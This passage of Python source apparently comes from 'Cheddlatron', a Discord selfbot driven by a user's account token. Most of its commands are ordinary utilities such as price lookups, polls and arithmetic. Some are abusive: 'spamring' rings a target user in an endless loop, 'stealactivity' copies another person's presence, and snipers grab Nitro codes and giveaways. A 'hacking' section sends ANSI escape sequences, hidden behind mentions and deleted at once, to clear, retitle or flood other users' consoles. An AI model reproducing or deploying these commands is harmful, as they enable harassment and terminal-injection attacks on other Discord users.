        body = f"ID: {member.id}\nCreated Account On: {member.created_at.strftime('%a, %#d %B %Y, %I:%M %p UTC')}\nJoined Server On: {member.joined_at.strftime('%a, %#d %B %Y, %I:%M %p UTC')}\nFlags: {member.public_flags.value}\nHighest Role: {member.top_role}\nMutual Servers: \n{mutual_servers}"
    else:  
        if member is None:
            member = ctx.message.author
        heading = f"Who Is {member.display_name}"
        body = f"ID: {member.id}\nCreated Account On: {member.created_at.strftime('%a, %#d %B %Y, %I:%M %p UTC')}\nFlags: {member.public_flags.value}\nMutual Servers: \n{mutual_servers}"
    cmdname = "whois"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Sends a user's PFP. \nUsage: {config_get('prefix')}av <@user>", help="utility")
async def av(ctx, *, user: discord.User = Cheddlatron.user):
    format = "gif"
    if not user.avatar.is_animated():
        format = "png"
    avatar = user.avatar.replace(format=format if format != "gif" else None)
    await apiimg(ctx, avatar)

@Cheddlatron.command(description=f"Turns text into ASCII art. \nUsage: {config_get('prefix')}ascii <text>", help="utility")
async def ascii(ctx, *text):        
        try:
            f = pyfiglet.Figlet(font='standard')
        except pyfiglet.FontNotFound:
            return
        r = f.renderText(" ".join(text))
        if len(r) > 2000:
            await ctx.send("```Too many characters```", delete_after=5)
            return
        await ctx.send(f"```{r}```")

@Cheddlatron.command(description=f"Sends a blank message. \nUsage: {config_get('prefix')}emptymsg", help="utility")
async def emptymsg(ctx):     
    await ctx.send(chr(173))

@Cheddlatron.command(description=f"Displays bitcoin prices. \nUsage: {config_get('prefix')}btc", help="utility")
async def btc(ctx):     
    r = requesters.get('https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR,GBP')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    gbp = r['GBP']
    heading = "Bitcoin"
    body = f"USD: ${str(usd)}\nEUR: €{str(eur)}\nGBP: £{str(gbp)}"
    cmdname = "btc"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Displays etherium prices. \nUsage: {config_get('prefix')}eth", help="utility")
async def eth(ctx):     
    r = requesters.get('https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD,EUR,GBP')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    gbp = r['GBP']
    heading = "Etherium"
    body = f"USD: ${str(usd)}\nEUR: €{str(eur)}\nGBP: £{str(gbp)}"
    cmdname = "eth"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Displays litecoin prices. \nUsage: {config_get('prefix')}ltc", help="utility")
async def ltc(ctx):     
    r = requesters.get('https://min-api.cryptocompare.com/data/price?fsym=LTC&tsyms=USD,EUR,GBP')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    gbp = r['GBP']
    heading = "Litecoin"
    body = f"USD: ${str(usd)}\nEUR: €{str(eur)}\nGBP: £{str(gbp)}"
    cmdname = "ltc"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Displays dogecoin prices. \nUsage: {config_get('prefix')}dogecoin", help="utility")
async def dogecoin(ctx):     
    r = requesters.get('https://min-api.cryptocompare.com/data/price?fsym=DOGE&tsyms=USD,EUR,GBP')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    gbp = r['GBP']
    heading = "Dogecoin"
    body = f"USD: ${str(usd)}\nEUR: €{str(eur)}\nGBP: £{str(gbp)}"
    cmdname = "dogecoin"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Sends a server's PFP. \nUsage: {config_get('prefix')}serverpfp", help="utility")
async def serverpfp(ctx):     
    await ctx.send(ctx.guild.icon.replace(format="png", size=1024))

@Cheddlatron.command(description=f"Creates a poll. \nUsage: {config_get('prefix')}poll <question>", help="utility")
async def poll(ctx, *, question: str="Cheddlatron"):    
    heading = "Poll"
    body = question
    cmdname = "poll"
    message = await panelmaker(ctx, heading, body, cmdname)
    message
    options = {'\N{THUMBS UP SIGN}',
              '\N{THUMBS DOWN SIGN}'}
    for choice in options:
        await message.add_reaction(emoji=choice)

@Cheddlatron.command(description=f"Creates a discord embedded poll with multiple options. \nUsage: {config_get('prefix')}multipoll <question> <duartion (1-336 (hours))> \n<option> <emoji> (up to 10 options)", help="utility")
async def multipoll(ctx, question, duration, *options_and_emojis: str): 
    if len(options_and_emojis) < 2 or len(options_and_emojis) % 2 != 0 or len(options_and_emojis) > 20:
        heading = "ERROR"
        body = "Please provide between 1 and 10 options with emojis."
        cmdname = "ERROR"
        await panelmaker(ctx, heading, body, cmdname)
        return
    try: 
        int(duration)
    except:
        duration=24
    options = options_and_emojis[::2]
    emojis = options_and_emojis[1::2]

    options_pairs = list(zip(options, emojis))

    url = f"https://discord.com/api/v9/channels/{ctx.channel.id}/messages"
    headers = {
        "authorization": config_get('token'),
        "x-super-properties": getxsuper()
    }
    json_data = {
        "content": "",
        "tts": False,
        "poll": {
            "question": {"text": question},
            "duration": duration,
            "layout_type": 1,
            "allow_multiselect": False,
            "answers": []
        }
    }
    for option, emoji in options_pairs[:10]:
        if (emoji.startswith('<:') or emoji.startswith('<a:')) and emoji.endswith('>'):
            parts = emoji.split(':')
            if len(parts) == 3:
                emoji_id = parts[2].replace('>', '')
                json_data["poll"]["answers"].append({"poll_media": {"text": option, "emoji": {"id": f"{emoji_id}", "name": ""}}})
            else:
                continue
        else:
            json_data["poll"]["answers"].append({"poll_media": {"text": option, "emoji": {"name": emoji}}})

    print(json_data)
    req = requesters.post(url=url, headers=headers, json_data=json_data)
    print(req.status_code)
    print(req.text)

@Cheddlatron.command(description=f"Created an embedded discord poll with yes or no answers. \nUsage: {config_get('prefix')}dpoll [length of poll in hours] [question]", help="utility")
async def dpoll(ctx, duration: typing.Optional[int]=24, *,question: str="Cheddlatron"):
    url = f"https://discord.com/api/v9/channels/{ctx.channel.id}/messages"
    headers = {
        "authorization": config_get('token'),
        "x-super-properties": getxsuper()
        }
    json_data = {
        "content": "",
        "tts": False,
        "poll": {
            "question": {"text": question},
            "duration": duration,
            "layout_type": 1,
            "allow_multiselect": False,
            "answers": [{"poll_media": {"text": "Yes", "emoji": {"name": "✅"}}}, {"poll_media": {"text": "No", "emoji": {"name": "❌"}}}]
        }
    }

    requesters.post(url=url, headers=headers, json_data=json_data)

@Cheddlatron.command(description=f"Enables Dev Tools on Discord app. \nUsage: {config_get('prefix')}devtools", help="utility")
async def devtools(ctx):
    os_name = platform.system()

    if os_name == "Windows":
        pcname = os.getlogin()
        settings_path = f"C://Users//{pcname}//AppData//Roaming//discord//settings.json"
    elif os_name == "Darwin":
        pcname = os.getlogin()
        settings_path = f"/Users/{pcname}/Library/Application Support/discord/settings.json"
    elif os_name == "Linux":
        pcname = os.getlogin()
        settings_path = f"/home/{pcname}/.config/discord/settings.json"
    else:
        await ctx.send("Unsupported operating system.")
        return

    try:
        with open(settings_path, "r", encoding="utf-8") as json_file:
            data = json.load(json_file)

        if "DANGEROUS_ENABLE_DEVTOOLS_ONLY_ENABLE_IF_YOU_KNOW_WHAT_YOURE_DOING" not in data:
            data["DANGEROUS_ENABLE_DEVTOOLS_ONLY_ENABLE_IF_YOU_KNOW_WHAT_YOURE_DOING"] = True

            with open(settings_path, 'w', encoding="utf-8") as json_file:
                json.dump(data, json_file, indent=4)

        heading = "Dev Tools"
        body = "Discord Dev Tools have been enabled!"
        cmdname = "devtools"
        await panelmaker(ctx, heading, body, cmdname)
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@Cheddlatron.command(aliases=["guildinfo"], description=f"Displays info about a server. \nUsage: {config_get('prefix')}serverinfo", help="utility")
async def serverinfo(ctx):    
    owner = str(ctx.guild.owner)[:-2] if ctx.guild.owner else "Could Not Determine Owner"
    date_format = "%a, %d %b %Y %I:%M %p"
    heading = f"Info on {ctx.guild.name}"
    body = f"Server Owner: {owner}\nServer ID: {ctx.guild.id}\nServer Created At: {ctx.guild.created_at.strftime(date_format)}\nMembers: {(ctx.guild.member_count)}\nRoles: {len(ctx.guild.roles)}\nText Channels: {len(ctx.guild.text_channels)}\nVoice Channels: {len(ctx.guild.voice_channels)}\nCategories: {len(ctx.guild.categories)}"
    cmdname = "serverinfo"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Displays info about a server. \nUsage: {config_get('prefix')}getroles", help="utility")
async def getroles(ctx):    
    roles = list(ctx.guild.roles)
    roles.reverse()
    roleStr = ""
    for role in roles:
        if role.name == "@everyone":
            roleStr += "@\u200beveryone"
        else:
            roleStr += role.name + "\n"
    heading = f"{ctx.guild.name} Roles"
    body = roleStr
    await ctx.send(f"```{heading}\n\n{body}```")

@Cheddlatron.command(description=f"Shuts down the bot. \nUsage: {config_get('prefix')}shutdown", help="utility")
async def shutdown(ctx):    
    os._exit(0)

@Cheddlatron.command(description=f"Cleans the last few embeds sent by the bot before the deltimer occurs. \nUsage: {config_get('prefix')}cleanup", help="utility")
async def cleanup(ctx):   
    messages = await ctx.channel.history(limit=15).flatten()
    count_deleted = 0
    for message in messages:
        if count_deleted >= 7:
            break
        if message.author == Cheddlatron.user and ">" in message.content:
            await message.delete()
            count_deleted += 1
    clean_message = await ctx.send("**All clean!**")
    await asyncio.sleep(3)
    await clean_message.delete()

@Cheddlatron.command(description=f"Adds 2 numbers together. \nUsage: {config_get('prefix')}add <number1> <number2>", help="utility")
async def add(ctx,a:float,b:float):    
    await ctx.send(f"```{a}+{b}={a+b}```")

@Cheddlatron.command(description=f"Subtracts a number from another. \nUsage: {config_get('prefix')}subtract <number1> <number2>", help="utility")
async def subtract(ctx,a:float,b:float):    
    await ctx.send(f"```{a}-{b}={a-b}```")

@Cheddlatron.command(description=f"Multiplies 2 numbers together. \nUsage: {config_get('prefix')}multiply <number1> <number2>", help="utility")
async def multiply(ctx,a:float,b:float):    
    await ctx.send(f"```{a}x{b}={a*b}```")

@Cheddlatron.command(description=f"Divides a number by the other. \nUsage: {config_get('prefix')}divide <number1> <number2>", help="utility")
async def divide(ctx,a:float,b:float):    
    await ctx.send(f"```{a}÷{b}={a/b}```")

@Cheddlatron.command(description=f"Converts a fraction to a decimal. \nUsage: {config_get('prefix')}fractodec <numerator> <denominator>", help="utility")
async def fractodec(ctx, numerator: int, denominator: int):   
    res = numerator / denominator
    await ctx.send(f"```{numerator} Over {denominator}={res}```")

@Cheddlatron.command(description=f"Converts a decimal to a fraction. \nUsage: {config_get('prefix')}dectofrac <decimal>", help="utility")
async def dectofrac(ctx, n: float):    
    res = Fraction(n)
    await ctx.send(f"```{n} as a fraction is {res}```")

@Cheddlatron.command(description=f"Steals another discord users rich presence. \nUsage: {config_get('prefix')}stealactivity <@user>", help="utility")
async def stealactivity(ctx, member: discord.User):
    global fetchedactivity
    req = requesters.get(f"https://discord.com/api/v9/users/{member.id}/profile?with_mutual_guilds=true", headers={"Authorization": config_get('token'), "x-super-properties": getxsuper()}).json()
    if not req.get("mutual_guilds"):
        heading = "Error"
        body = "You have no mutual guilds with this user and so cannot get their presence data."
        cmdname = "ERROR"
        await panelmaker(ctx, heading, body, cmdname)
        return
    guildid = req["mutual_guilds"][0]["id"]
    guild = await Cheddlatron.fetch_guild(int(guildid))
    member = await guild.query_members(limit=1, user_ids=[f'{member.id}'], presences=True, cache=False)
    if fetchedactivity == "[]":
        heading = "Error"
        body = "User has no activity currently."
        cmdname = "ERROR"
        await panelmaker(ctx, heading, body, cmdname)
        return
    ws = Cheddlatron._get_websocket()
    req = requesters.get("https://discord.com/api/v9/users/@me/settings-proto/1", headers={"Authorization": config_get('token'), "x-super-properties": getxsuper()}).json()
    settings = base64.b64decode(req['settings']).decode('utf-8', errors='ignore')
    if "invisible" in settings:
        Status = "dnd"
    elif "online" in settings:
        Status = "online"
    elif "idle" in settings:
        Status = "idle"
    else:
        Status = "dnd"
    jasondata = {"op": 3, "d":{"status": Status, "since": 0, "activities": json.loads(fetchedactivity), "afk": True}}
    await ws.send_as_json(jasondata)
    fetchedactivity = ""
    heading = "Activity Stolen!"
    body = "Successfully taken and applied stolen activity."
    cmdname = "stealactivity"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Sends a users activity json. \nUsage: {config_get('prefix')}getactivity <@user>", help="utility")
async def getactivity(ctx, user: discord.User):
    global fetchedactivity
    req = requesters.get(f"https://discord.com/api/v9/users/{user.id}/profile?with_mutual_guilds=true", headers={"Authorization": config_get('token'), "x-super-properties": getxsuper()}).json()
    if not req.get("mutual_guilds"):
        heading = "Error"
        body = "You have no mutual guilds with this user and so cannot get their presence data."
        cmdname = "ERROR"
        await panelmaker(ctx, heading, body, cmdname)
        return
    guildid = req["mutual_guilds"][0]["id"]
    guild = await Cheddlatron.fetch_guild(int(guildid))
    await guild.query_members(limit=1, user_ids=[f'{user.id}'], presences=True, cache=False)
    if fetchedactivity == "[]":
        heading = "Error"
        body = "User has no activity currently."
        cmdname = "ERROR"
        await panelmaker(ctx, heading, body, cmdname)
        return
    else:
        def split_message(text, max_length=1900):
            if isinstance(text, (dict, list)):
                text = json.dumps(text, indent=2)
            messages = []
            current_chunk = ""
            lines = text.splitlines()  
            for line in lines:
                if len(current_chunk) + len(line) + 1 > max_length:
                    messages.append(current_chunk)
                    current_chunk = line
                else:
                    if current_chunk:
                        current_chunk += "\n"
                    current_chunk += line
            if current_chunk:
                messages.append(current_chunk)
            
            return messages
        if len(fetchedactivity) > 2000:
            messasges = split_message(fetchedactivity)
            for message in messasges:
                await ctx.send(f"```{message}```")
        else:
            await ctx.send(f"```{fetchedactivity}```")
        fetchedactivity = ""

@Cheddlatron.command(description=f"Spam Rings a user. \nUsage: {config_get('prefix')}spamring <@user>")
async def spamring(ctx, user: discord.User):
    chanid = ctx.channel.id
    payload = {"recipients": [f"{user.id}"]}
    while True:
        requesters.post(f"https://discord.com/api/v9/channels/{chanid}/call/ring", headers={'Authorization': config_get('token'), "x-super-properties": getxsuper()}, json_data=payload)


@Cheddlatron.command(description=f"Clones a server. \nUsage: {config_get('prefix')}cloneserver", help="utility")
async def cloneserver(ctx):
    try:
        source_guild = ctx.guild
        source_guild_name = source_guild.name
        icon_url = source_guild.icon

        icon_bytes = None
        if icon_url:
            response = requested.get(icon_url)
            icon_bytes = BytesIO(response.content)

        new_guild_data = await make_server(name=source_guild_name, icon=icon_bytes.read()) if icon_bytes else await make_server(name=source_guild_name)

        if isinstance(new_guild_data, dict):
            new_guild = Cheddlatron.get_guild(int(new_guild_data['id']))
        else:
            new_guild = new_guild_data
        
        if not new_guild:
            try:
                await asyncio.sleep(2)
                new_guild = Cheddlatron.get_guild(int(new_guild_data['id'])) if isinstance(new_guild_data, dict) else new_guild
            except Exception as e:
                print(f"{Fore.LIGHTRED_EX}[ERROR]: {Fore.WHITE}Failed to fetch the newly created guild and cannot continue, please try again.")
                return

        channels = [channel.id for channel in new_guild.channels]
        for channel in channels:
            try:
                chan = Cheddlatron.get_channel(channel)
                await chan.delete()
            except:
                try:
                    chan = Cheddlatron.get_channel(channel)
                    await chan.delete()
                except:
                    print(f"{Fore.LIGHTRED_EX}[ERROR]: {Fore.WHITE}Unable to delete default channels in cloned server, you will have to do this manually.")

        new_roles = {}
        for role in sorted(source_guild.roles, reverse=True):
            if role.name != "@everyone":
                created_role = await new_guild.create_role(
                    name=role.name,
                    permissions=role.permissions,
                    color=role.color,
                    hoist=role.hoist,
                    mentionable=role.mentionable
                )
                new_roles[role.id] = created_role

        new_categories = {}
        for category in source_guild.categories:
            created_category = await new_guild.create_category_channel(
                name=category.name,
                position=category.position
            )
            new_categories[category.id] = created_category

        for channel in source_guild.channels:
            overwrites = {}
            for target, overwrite in channel.overwrites.items():
                if target.id in new_roles:
                    overwrites[new_roles[target.id]] = overwrite

            category = new_categories.get(channel.category.id) if channel.category else None
            if isinstance(channel, discord.TextChannel):
                try:
                    await new_guild.create_text_channel(
                        name=channel.name,
                        position=channel.position,
                        category=category,
                        overwrites=overwrites
                    )
                except:
                    pass
            elif isinstance(channel, discord.VoiceChannel):
                try:
                    await new_guild.create_voice_channel(
                        name=channel.name,
                        position=channel.position,
                        category=category,
                        overwrites=overwrites
                    )
                except:
                    pass
        heading = "Cloning Successful!"
        body = f"{source_guild_name} cloned successfully!"
        cmdname = "cloneserver"
        await panelmaker(ctx, heading, body, cmdname)

    except Exception as e:
        import traceback
        error_details = traceback.format_exc()
        print(f"[Error]: {error_details}")
        await send_webhook("Clone Server Error", f"An error occurred while cloning the server: {str(e)}. Please check the logs for more details.", config_get('error_webhook_url'))
        heading = "Error"
        body = str(e)
        cmdname = "ERROR"
        await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Add a custom alias for a command. \nUsage: {config_get('prefix')}alias <command name> <alias>", help="utility")
async def alias(ctx, command_name: str, alias: str):
        heading, body, cmdname = check_and_add_alias(command_name, alias)
        await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Deletes a custom alias. \nUsage: {config_get('prefix')}delalias <alias>", help="utility")
async def delalias(ctx, alias):
    heading, body, cmdname = check_and_remove_alias(alias)
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Lists all custom aliases. \nUsage: {config_get('prefix')}listaliases", help="utility")
async def listaliases(ctx):
    with open("Data//Settings//Configs//aliases.json", "r") as file:
        aliases = json.load(file)
    
    if not aliases:
        heading = "Error"
        body =  "No custom aliases found."
        cmdname = "ERROR"
        await panelmaker(ctx, heading, body, cmdname)
    else:
        result = "Custom Aliases:\n\n"
        for command_name, alias_list in aliases.items():
            result += f"Command: {command_name}\n"
            result += "Aliases: " + ", ".join(alias_list) + "\n\n"
        
        await ctx.send(f"```{result.strip()}```", delete_after=int(config_get('delete_timer')))

@Cheddlatron.command(description=f"Adds a discord bot to the list of bots to be giveaway sniped. \nUsage: {config_get('prefix')}gwbot <id of bot>", help="utility")
async def gwbot(ctx, id):
    with open('config.json', 'r') as file:
        data = json.load(file)
    if 'giveaway_bot_ids' not in data:
        data['giveaway_bot_ids'] = []
    if int(id) in data['giveaway_bot_ids']:
        data['giveaway_bot_ids'].remove(int(id))
        heading = "ID Removed"
        body = f"Bot with ID '{id}' was removed from the giveaway sniper."
    else:
        data['giveaway_bot_ids'].append(int(id))
        heading = "ID Added"
        body = f"Bot with ID '{id}' was added to the giveaway sniper."
    cmdname = "gwbot"
    await panelmaker(ctx, heading, body, cmdname)
    with open('config.json', 'w') as file:
        json.dump(data, file, indent=4)

@Cheddlatron.command(description=f"Blacklists a server from the giveaway bot. \nUsage: {config_get('prefix')}gwblacklist <server id>", help="utility")
async def gwblacklist(ctx, id):
    with open('config.json', 'r') as file:
        data = json.load(file)
    if 'giveaway_blacklist_ids' not in data:
        data['giveaway_blacklist_ids'] = []
    if int(id) in data['giveaway_blacklist_ids']:
        data['giveaway_blacklist_ids'].remove(int(id))
        heading = "Server Whitelisted"
        body = f"Server with ID '{id}' was whitelisted for the giveaway sniper."
    else:
        data['giveaway_blacklist_ids'].append(int(id))
        heading = "Server Blacklisted"
        body = f"server with ID '{id}' was blacklisted from the giveaway sniper."
    cmdname = "gwblacklist"
    await panelmaker(ctx, heading, body, cmdname)
    with open('config.json', 'w') as file:
        json.dump(data, file, indent=4)
        
@Cheddlatron.command(description=f"Changes the delay of the giveaway sniper. \nUsage: {config_get('prefix')}gdelay <delay in seconds>", help="utility")
async def gdelay(ctx, delay):
    config_edit("giveaway_delay", delay)
    heading = "Delay Updated"
    body = f"Giveaway sniper delay updated to {delay} seconds."
    cmdname = "gdelay"
    await panelmaker(ctx, heading, body, cmdname)
    
@Cheddlatron.command(description=f"Changes the device the bot is set as \nUsage: {config_get('prefix')}device <device>\nDevices: desktop, mobile, web, console", help="utility")
async def device(ctx, device):
    devices = ["console", "web", "desktop", "mobile"]
    if device.lower() in devices:
        config_edit("device", device)
        heading = "Device Updated"
        body = f"Bot device changed to {device.lower()}"
        cmdname = "device"
        await panelmaker(ctx, heading, body, cmdname)
        try:
            os_name = platform.system()
            if os_name == 'Windows':
                os.startfile("Cheddlatron.exe")
                os._exit(1)
            elif os_name in ['Darwin', 'Linux']:
                os.system("./Cheddlatron.bin")
            else:
                raise NotImplementedError("Unsupported operating system")
            os._exit(1)
        except (FileNotFoundError, NotImplementedError):
            os.system("python Cheddlatron.py")
            os._exit(1)
        except Exception as e:
            pass
    else:
        heading = "Invalid Device"
        body = f"Please use a valid device type.\nDevices: desktop, mobile, web, console"
        cmdname = "device"
        await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Blacklists a server from the nitro sniper. \nUsage: {config_get('prefix')}nitroblacklist [server id]", help="utility")
async def nitroblacklist(ctx, id=None):
    if id == None:
        id = ctx.guild.id
    with open('config.json', 'r') as file:
        data = json.load(file)
    if 'nitro_blacklist_ids' not in data:
        data['nitro_blacklist_ids'] = []
    if int(id) in data['nitro_blacklist_ids']:
        data['nitro_blacklist_ids'].remove(int(id))
        heading = "Server Whitelisted"
        body = f"Server with ID '{id}' was whitelisted for the nitro sniper."
    else:
        data['nitro_blacklist_ids'].append(int(id))
        heading = "Server Blacklisted"
        body = f"server with ID '{id}' was blacklisted from the nitro sniper."
    cmdname = "nitroblacklist"
    await panelmaker(ctx, heading, body, cmdname)
    with open('config.json', 'w') as file:
        json.dump(data, file, indent=4)

@Cheddlatron.command(description=f"Shuts down the PC immediately. \nUsage: {config_get('prefix')}shutdownpc", help="utility")
async def shutdownpc(ctx):
    os.system('shutdown /s /t 0')
    heading = "Shutdown Initiated!"
    body = "PC will shut down immediately."
    cmdname = "shutdown"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Puts the PC into hibernation immediately. (This requires Hibernation enabled on your PC) \nUsage: {config_get('prefix')}hibernatepc", help="utility")
async def hibernatepc(ctx):
    os.system('shutdown /h')
    heading = "Hibernation Initiated!"
    body = "PC will enter hibernation immediately."
    cmdname = "hibernate"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Puts the PC to sleep immediately. \nUsage: {config_get('prefix')}sleeppc", help="utility")
async def sleeppc(ctx):
    os.system('rundll32.exe powrprof.dll,SetSuspendState 0,1,0')
    heading = "Sleep Mode Activated!"
    body = "PC will go to sleep immediately."
    cmdname = "sleep"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Locks the PC immediately. \nUsage: {config_get('prefix')}lockpc", help="utility")
async def lockpc(ctx):
    os.system('rundll32.exe user32.dll,LockWorkStation')
    heading = "PC Lock Initiated!"
    body = "PC has been locked."
    cmdname = "lock"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Restarts the PC immediately. \nUsage: {config_get('prefix')}restartpc", help="utility")
async def restartpc(ctx):
    os.system('shutdown /r /t 0')
    heading = "Restart Initiated!"
    body = "PC will restart immediately."
    cmdname = "restart"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description = f"Gets someones Xbox UID from their username. \nUsage: {config_get('prefix')}xuid <username>", help="utility")
async def xuid(ctx, *,username):
    username = urlify(username)
    resp = requesters.get(f"http://192.9.186.202:3113/profile/gt/{username}")
    if resp.text == "null":
        heading = "Could Not Get XUID"
        body = "Username is probably incorrect."
        cmdname = "xuid"
    else:
        try:
            heading = f"XUID For {username}"
            body = resp.json()['profileUsers'][0]['id']
            cmdname = "xuid"
        except:
            heading = "Could Not Get XUID"
            body = "Username is probably incorrect."
            cmdname = "xuid"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Creates a backup of your favourite gifs. \nUsage {config_get('prefix')}backupgifs", help="utility")
async def backupgifs(ctx):
    url = "https://discord.com/api/v9/users/@me/settings-proto/2"
    headers = {
        "Authorization": config_get('token'),
        "X-Super-Properties": getxsuper()
    }
    req = requesters.get(url, headers)
    data = req.json()
    settings_key = data['settings']
    decoded_data = base64.b64decode(settings_key)
    settings = FrecencyUserSettings()
    settings = settings.FromString(decoded_data)
    favorite_gifs_data = settings.favorite_gifs
    favorite_gifs_dict = MessageToDict(favorite_gifs_data)
    with open('Data/Backups/favorite_gifs.txt', 'w') as f:
        json.dump(favorite_gifs_dict, f, indent=4)
    heading = "Gifs Successfully Backed-Up"
    body = "Favourite gifs have been backed up to 'Data/Backups/favorite_gifs.txt'"
    cmdname = "backupgifs"
    await panelmaker(ctx,heading,body,cmdname)

@Cheddlatron.command(description=f"Imports your favourite gifs to your account using backed-up gifs from the backupgifs cmd. \nUsage: {config_get('prefix')}importgifs")
async def importgifs(ctx):
    def getsettings():
        url = "https://discord.com/api/v9/users/@me/settings-proto/2"
        headers = {
            "Authorization": config_get('token'),
            "X-Super-Properties": getxsuper(),
            "Content-Type": "application/json"
        }
        req = requesters.get(url, headers=headers)
        data = req.json()
        settings_key = data['settings']
        decoded_data = base64.b64decode(settings_key)
        settings = FrecencyUserSettings()
        settings.ParseFromString(decoded_data)
        return MessageToDict(settings)
    def add_missing_gifs(settings_dict, favorite_gifs_dict):
        settings_gifs = settings_dict.get('favoriteGifs', {}).get('gifs', {})
        favorite_gifs = favorite_gifs_dict.get('favoriteGifs', {}).get('gifs', {})
        missing_gifs = {url: gif_data for url, gif_data in favorite_gifs.items() if url not in settings_gifs}
        for url, gif_data in missing_gifs.items():
            existing_key = next((key for key, value in settings_gifs.items() if value['src'] == gif_data['src']), None)
            if existing_key:
                settings_gifs[existing_key] = {
                    'format': gif_data['format'],
                    'src': gif_data['src'],
                    'width': gif_data.get('width'),
                    'height': gif_data.get('height'),
                    'order': len(settings_gifs) + 1
                }
            else:
                settings_gifs[url] = {
                    'format': gif_data['format'],
                    'src': gif_data['src'],
                    'width': gif_data.get('width'),
                    'height': gif_data.get('height'),
                    'order': len(settings_gifs) + 1
                }
        settings_dict['favoriteGifs']['gifs'] = settings_gifs
        return settings_dict
    settings = getsettings()
    frecency = FrecencyUserSettings()
    with open('Data/Backups/favorite_gifs.txt', 'r') as file:
        content = json.load(file)
    content = {"favoriteGifs": content}
    updated_settings = add_missing_gifs(settings, content)
    ParseDict(updated_settings, frecency)
    serialized_data = frecency.SerializeToString()
    encoded_content = base64.b64encode(serialized_data).decode()
    jsondata = {"settings": f"{encoded_content}"}
    req = requesters.patch("https://discord.com/api/v9/users/@me/settings-proto/2", headers={"Authorization": config_get('token'), "X-Super-Properties": getxsuper(), "Content-Type": "application/json"}, json_data=jsondata)

    heading = "Successfully Imported Gifs"
    body = "All gifs have been imported!"
    cmdname = "importgifs"
    await panelmaker(ctx,heading,body,cmdname)

#UTILITY COMMANDS------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


#HACKING COMMANDS------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
@Cheddlatron.command(description=f"Clears someones console. \nUsage: {config_get('prefix')}injectclear [@user]", help="hacking")
async def injectclear(ctx, user: discord.User = None):
    if user is not None:
        user_mention = user.mention
    else:
        user_mention = ""
    code = f'{user_mention} \033c'
    await ctx.send(f'{code}', delete_after=0)

@Cheddlatron.command(description=f"Scrolls someones console up. \nUsage: {config_get('prefix')}injectscrollup [@user] [amount to scroll up by]", help="hacking")
async def injectscrollup(ctx, user: typing.Optional[discord.User] = None, amount=50):
    if user is not None:
        user_mention = user.mention
    else:
        user_mention = ""
    code = f'{user_mention} \033[{amount}S'
    await ctx.send(f'{code}', delete_after=0)

@Cheddlatron.command(description=f"Scrolls someones console down. \nUsage: {config_get('prefix')}injectscrolldown [@user] [amount to scroll down by]", help="hacking")
async def injectscrolldown(ctx, user: typing.Optional[discord.User] = None, amount=50):
    if user is not None:
        user_mention = user.mention
    else:
        user_mention = ""
    code = f'{user_mention} \033[{amount}T'
    await ctx.send(f'{code}', delete_after=0)

@Cheddlatron.command(description=f"Turns someones console fully white. \nUsage: {config_get('prefix')}injectchaos [@user]", help="hacking")
async def injectchaos(ctx, user: discord.User = None):
    if user is not None:
        user_mention = user.mention
    else:
        user_mention = ""
    code = f'''{user_mention} \x1b[7m\x1b[2J\x1b[15;D\x1b[0m'''
    await ctx.send(f'{code}', delete_after=0)

@Cheddlatron.command(description=f"Prints invisible text in someones console. \nUsage: {config_get('prefix')}injectinvistext [@user] [invis text]", help="hacking")
async def injectinvistext(ctx, user: typing.Optional[discord.User] = None, *, message="Cheddlatron"):
    if user is not None:
        user_mention = user.mention
    else:
        user_mention = ""
    code = f'{user_mention} \033[30m{message}'
    await ctx.send(f'{code}', delete_after=0)

@Cheddlatron.command(description=f"Triggers a windows alert sound from their console. \nUsage: {config_get('prefix')}injectalert [@user] [number of alerts]", help="hacking")
async def injectalert(ctx, user: typing.Optional[discord.User] = None, amount=1):
    if user is not None:
        user_mention = user.mention
    else:
        user_mention = ""
    code = f'{user_mention} \007'
    for i in range(0, int(amount)):
        await ctx.send(f'{code}', delete_after=0)

@Cheddlatron.command(description=f"Changes someones console title bar text. \nUsage: {config_get('prefix')}injecttitle [@user] [title text]", help="hacking")
async def injecttitle(ctx, user: typing.Optional[discord.User] = None, *, title=None):
    if user is not None:
        user_mention = user.mention
    else:
        user_mention = ""
    if title == None:
        title = "Cheddlatron"
    code = f'{user_mention} \033]0;{title}\007'
    await ctx.send(f'{code}', delete_after=0)

@Cheddlatron.command(description=f"Cuts someones console in half. \nUsage: {config_get('prefix')}injectcut [@user]", help="hacking")
async def injectcut(ctx, user: discord.User = None):
    if user is not None:
        user_mention = user.mention
    else:
        user_mention = ""
    code = f'{user_mention} \033[S' * 20 + '\033[T' * 20  
    await ctx.send(f'{code}', delete_after=0)

@Cheddlatron.command(description=f"Takes over someones console by clearing it changing their title and displaying ascii art. \nUsage: {config_get('prefix')}injecttakeover [@user]", help="hacking")
